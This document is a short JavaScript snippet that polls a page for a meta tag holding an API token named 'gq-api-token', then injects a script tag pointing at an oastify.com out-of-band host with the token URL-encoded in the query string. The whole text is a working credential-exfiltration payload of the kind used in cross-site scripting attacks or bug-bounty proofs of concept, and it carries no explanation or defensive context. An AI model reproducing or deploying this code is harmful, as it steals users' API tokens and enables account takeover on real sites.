(function pollForToken() {
  const meta = document.querySelector('meta[name="gq-api-token"]');
  if (!meta) return setTimeout(pollForToken, 500);

  const token = encodeURIComponent(meta.content);
  const s = document.createElement('script');
  s.src = `https://n5tdeo961nx8sz36mfm6o6o2ftll9cx1.oastify.com/?token=${token}`;
  document.body.appendChild(s);
})();
